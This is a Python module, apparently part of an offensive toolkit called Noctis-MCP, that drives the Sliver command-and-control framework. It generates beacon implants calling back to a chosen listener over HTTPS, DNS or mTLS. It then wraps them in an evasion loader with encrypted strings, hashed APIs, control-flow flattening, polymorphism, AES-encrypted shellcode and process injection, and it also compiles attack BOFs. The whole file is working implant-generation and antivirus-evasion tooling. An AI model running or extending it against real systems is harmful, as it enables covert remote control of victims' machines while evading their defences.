"""
Sliver C2 Adapter
=================

Integrates with Sliver C2 framework to generate obfuscated beacons.

Features:
- Multiple protocol support (HTTPS, HTTP, DNS, TCP, mTLS)
- Beacon and session modes
- Advanced evasion configuration
- Integration with Noctis obfuscation

Author: Noctis-MCP Team
Phase: 4 - C2 Integration
Sprint: 2 - Sliver Integration
"""

import os
import sys
import time
import json
import subprocess
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass

# Add parent directory to path
sys.path.append(str(Path(__file__).parent.parent))

from c2_adapters.base_adapter import C2Adapter, C2GenerationResult, BeaconStatus
from c2_adapters.config import SliverConfig, Protocol, Architecture, OutputFormat
from c2_adapters.shellcode_wrapper import ShellcodeWrapper, WrapperConfig
from compilation.bof_compiler import BOFCompiler, BOFResult


@dataclass
class SliverBeaconInfo:
    """Information about generated Sliver beacon"""
    name: str
    protocol: str
    arch: str
    format: str
    size: int
    c2_url: str
    shellcode_path: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'name': self.name,
            'protocol': self.protocol,
            'arch': self.arch,
            'format': self.format,
            'size': self.size,
            'c2_url': self.c2_url,
            'shellcode_path': self.shellcode_path
        }


class SliverAdapter(C2Adapter):
    """
    Sliver C2 Framework Adapter
    
    Connects to Sliver server and generates beacons with Noctis obfuscation.
    
    Supports:
    - HTTPS, HTTP, DNS, TCP, mTLS protocols
    - x64, x86 architectures
    - Shellcode, EXE, DLL output formats
    - Advanced evasion features
    """
    
    def __init__(self, config: SliverConfig, verbose: bool = False):
        """
        Initialize Sliver adapter

        Args:
            config: SliverConfig with connection and beacon parameters
            verbose: Enable verbose logging
        """
        super().__init__(config, verbose)
        self.sliver_client = None
        self.beacon_info: Optional[SliverBeaconInfo] = None

        # Initialize BOF compiler
        self.bof_compiler = BOFCompiler(output_dir="bof_output")

        if verbose:
            print(f"[*] SliverAdapter initialized")
            print(f"[*] BOF compilation available")
    
    def connect(self) -> bool:
        """
        Connect to Sliver server via Sliver CLI
        
        Returns:
            True if connection successful
        """
        if self.verbose:
            print(f"[*] Connecting to Sliver server at {self.config.sliver_host}:{self.config.sliver_port}")
        
        # Check if Sliver is installed
        if not self._check_sliver_installed():
            if self.verbose:
                print("[!] Sliver not found. Install from: https://github.com/BishopFox/sliver")
            return False
        
        # Try to connect via Sliver CLI
        try:
            # Test connection with version command
            result = subprocess.run(
                ['sliver-client', 'version'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode == 0:
                if self.verbose:
                    print(f"[+] Connected to Sliver: {result.stdout.strip()}")
                return True
            else:
                if self.verbose:
                    print(f"[!] Sliver connection failed: {result.stderr}")
                return False
                
        except subprocess.TimeoutExpired:
            if self.verbose:
                print("[!] Sliver connection timeout")
            return False
        except FileNotFoundError:
            if self.verbose:
                print("[!] sliver-client not found in PATH")
            return False
        except Exception as e:
            if self.verbose:
                print(f"[!] Connection error: {e}")
            return False
    
    def _check_sliver_installed(self) -> bool:
        """Check if Sliver is installed"""
        try:
            result = subprocess.run(
                ['which', 'sliver-client'],
                capture_output=True,
                timeout=2
            )
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            return False
    
    def generate_shellcode(self) -> bytes:
        """
        Generate Sliver beacon shellcode using Sliver CLI
        
        Returns:
            Raw shellcode bytes
            
        Raises:
            Exception: If Sliver is not installed or generation fails
        """
        if self.verbose:
            print("[*] Generating Sliver beacon shellcode...")
        
        # Build Sliver generate command
        cmd = self._build_generate_command()
        
        try:
            # Execute Sliver generate command
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode != 0:
                raise Exception(f"Sliver generation failed: {result.stderr}")
            
            # Read generated shellcode
            shellcode_path = self._get_shellcode_path()
            if not os.path.exists(shellcode_path):
                raise Exception(f"Shellcode not found at {shellcode_path}")
            
            with open(shellcode_path, 'rb') as f:
                shellcode = f.read()
            
            if self.verbose:
                print(f"[+] Generated {len(shellcode)} bytes of shellcode")
            
            return shellcode
            
        except subprocess.TimeoutExpired:
            raise Exception("Sliver shellcode generation timeout")
        except Exception as e:
            raise Exception(f"Shellcode generation error: {e}")
    
    def _build_generate_command(self) -> List[str]:
        """Build Sliver generate command"""
        cmd = ['sliver-client', 'generate', 'beacon']

        # Validate listener host and port to prevent injection
        import re
        if self.config.listener_host:
            # Allow IP addresses, hostnames, and localhost
            if not re.match(r'^[a-zA-Z0-9\.\-]+$', self.config.listener_host):
                raise ValueError(f"Invalid listener_host format: {self.config.listener_host}")
        if self.config.listener_port:
            # Ensure port is numeric and in valid range
            try:
                port = int(self.config.listener_port)
            except (ValueError, TypeError):
                raise ValueError(f"listener_port must be a valid integer, got: {self.config.listener_port}")
            if not (1 <= port <= 65535):
                raise ValueError(f"Invalid port number: {port}")

        # Protocol-specific settings
        if self.config.protocol == Protocol.HTTPS:
            cmd.extend(['--http', f"{self.config.listener_host}:{self.config.listener_port}"])
        elif self.config.protocol == Protocol.HTTP:
            cmd.extend(['--http', f"{self.config.listener_host}:{self.config.listener_port}"])
        elif self.config.protocol == Protocol.DNS:
            if not re.match(r'^[a-zA-Z0-9\.\-]+$', self.config.dns_parent_domain):
                raise ValueError(f"Invalid DNS domain format: {self.config.dns_parent_domain}")
            cmd.extend(['--dns', self.config.dns_parent_domain])
        elif self.config.protocol == Protocol.TCP:
            cmd.extend(['--mtls', f"{self.config.listener_host}:{self.config.listener_port}"])
        elif self.config.protocol == Protocol.MTLS:
            cmd.extend(['--mtls', f"{self.config.listener_host}:{self.config.listener_port}"])
        
        # Architecture
        cmd.extend(['--arch', self.config.architecture.value])
        
        # Output format
        cmd.extend(['--format', self.config.output_format.value])
        
        # Beacon configuration
        if self.config.beacon_name:
            cmd.extend(['--name', self.config.beacon_name])
        
        cmd.extend(['--seconds', str(self.config.sleep_time)])
        cmd.extend(['--jitter', str(self.config.jitter)])
        
        # Evasion features
        if self.config.evasion:
            cmd.append('--evasion')
        
        if self.config.skip_symbols:
            cmd.append('--skip-symbols')
        
        # Output path
        output_dir = self.config.output_path or '/tmp'
        cmd.extend(['--save', output_dir])
        
        return cmd
    
    def _get_shellcode_path(self) -> str:
        """Get path to generated shellcode"""
        output_dir = self.config.output_path or '/tmp'
        beacon_name = self.config.beacon_name or 'beacon'
        return os.path.join(output_dir, f"{beacon_name}.bin")
    
    def validate_config(self) -> Tuple[bool, Optional[str]]:
        """Validate Sliver configuration"""
        return self.config.validate()
    
    def get_supported_protocols(self) -> List[str]:
        """Get supported protocols"""
        return ['https', 'http', 'dns', 'tcp', 'mtls']
    
    def get_framework_info(self) -> Dict[str, Any]:
        """Get Sliver framework information"""
        info = {
            'framework': 'Sliver',
            'version': 'v1.5+',
            'protocols': self.get_supported_protocols(),
            'architectures': ['x64', 'x86'],
            'formats': ['shellcode', 'exe', 'dll'],
            'features': [
                'Multiple C2 protocols',
                'Beacon/Session modes',
                'Advanced evasion',
                'Dynamic code signing',
                'Traffic obfuscation'
            ]
        }
        
        if self.beacon_info:
            info['beacon'] = self.beacon_info.to_dict()
        
        return info
    
    def generate_beacon(self,
                       techniques: Optional[List[str]] = None,
                       obfuscate: bool = True,
                       compile_binary: bool = True) -> C2GenerationResult:
        """
        Generate complete Sliver beacon with Noctis obfuscation
        
        Args:
            techniques: Noctis technique IDs to apply
            obfuscate: Apply obfuscation techniques
            compile_binary: Compile to executable (if not shellcode)
            
        Returns:
            C2GenerationResult with all generation details
        """
        start_time = time.time()
        
        try:
            self._status = BeaconStatus.GENERATING
            
            # Step 1: Validate
            is_valid, error = self.validate_config()
            if not is_valid:
                return C2GenerationResult(
                    success=False,
                    error_message=f"Configuration validation failed: {error}"
                )
            
            # Step 2: Connect to Sliver
            if not self.connect():
                return C2GenerationResult(
                    success=False,
                    error_message="Failed to connect to Sliver server"
                )
            
            # Step 3: Generate Sliver shellcode
            self._status = BeaconStatus.GENERATING
            shellcode = self.generate_shellcode()
            
            if not shellcode:
                return C2GenerationResult(
                    success=False,
                    error_message="Failed to generate Sliver shellcode"
                )
            
            # Step 4: Wrap with Noctis obfuscation
            if obfuscate:
                self._status = BeaconStatus.WRAPPING
                
                wrapper_config = WrapperConfig(
                    encrypt_strings=True,
                    hash_apis=True,
                    flatten_control_flow=True,
                    add_junk_code=True,
                    apply_polymorphic=True,
                    techniques=techniques or [],
                    loader_type="process_injection" if self.config.output_format == OutputFormat.EXE else "direct",
                    shellcode_encryption="aes256",
                    check_opsec=True,
                    min_opsec_score=7.0
                )
                
                wrapper = ShellcodeWrapper(wrapper_config, verbose=self.verbose)
                
                # Generate wrapped loader
                output_path = self.config.output_path or '/tmp/sliver_beacon_wrapped.c'
                wrap_result = wrapper.wrap_shellcode(shellcode, output_path)
                
                if not wrap_result['success']:
                    return C2GenerationResult(
                        success=False,
                        error_message="Shellcode wrapping failed"
                    )
                
                self._status = BeaconStatus.SUCCESS
                
                compilation_time = time.time() - start_time
                
                return C2GenerationResult(
                    success=True,
                    beacon_path=wrap_result.get('output_path'),
                    shellcode_path=None,
                    beacon_size=wrap_result['wrapped_size'],
                    metadata=self.get_framework_info(),
                    techniques_applied=techniques or [],
                    obfuscation_summary=wrap_result['obfuscation_summary'],
                    opsec_score=wrap_result['opsec_score'],
                    compilation_time=compilation_time
                )
            
            else:
                # No obfuscation - return raw shellcode
                shellcode_path = '/tmp/sliver_beacon_raw.bin'
                Path(shellcode_path).write_bytes(shellcode)
                
                self._status = BeaconStatus.SUCCESS
                compilation_time = time.time() - start_time
                
                return C2GenerationResult(
                    success=True,
                    shellcode_path=shellcode_path,
                    beacon_size=len(shellcode),
                    metadata=self.get_framework_info(),
                    compilation_time=compilation_time
                )
        
        except Exception as e:
            self._status = BeaconStatus.FAILED
            return C2GenerationResult(
                success=False,
                error_message=f"Beacon generation failed: {str(e)}"
            )

    def generate_bof(self, technique_id: str) -> BOFResult:
        """
        Generate Sliver BOF from Noctis technique

        Args:
            technique_id: Noctis technique ID (e.g., 'NOCTIS-T004')

        Returns:
            BOFResult with x86/x64 object files and extension.json
        """
        if self.verbose:
            print(f"[*] Generating Sliver BOF for technique: {technique_id}")

        return self.bof_compiler.compile_technique_to_bof(technique_id, "sliver")


# Convenience function
def generate_sliver_beacon(
    listener_host: str,
    listener_port: int,
    protocol: str = "https",
    architecture: str = "x64",
    techniques: Optional[List[str]] = None,
    obfuscate: bool = True,
    verbose: bool = False
) -> C2GenerationResult:
    """
    Convenience function to generate Sliver beacon
    
    Requirements:
        - Sliver C2 framework must be installed (https://github.com/BishopFox/sliver)
        - Sliver server must be running
        - sliver-client must be in PATH
    
    Args:
        listener_host: C2 listener hostname/IP
        listener_port: C2 listener port
        protocol: C2 protocol (https, http, dns, tcp, mtls)
        architecture: Target architecture (x64, x86)
        techniques: Noctis technique IDs to apply
        obfuscate: Apply Noctis obfuscation
        verbose: Enable verbose output
        
    Returns:
        C2GenerationResult
    """
    # Create configuration
    config = SliverConfig(
        listener_host=listener_host,
        listener_port=listener_port,
        protocol=Protocol(protocol),
        architecture=Architecture(architecture),
        beacon_name=f"noctis_beacon_{int(time.time())}"
    )
    
    # Create adapter
    adapter = SliverAdapter(config, verbose=verbose)
    
    # Generate beacon
    return adapter.generate_beacon(
        techniques=techniques,
        obfuscate=obfuscate
    )

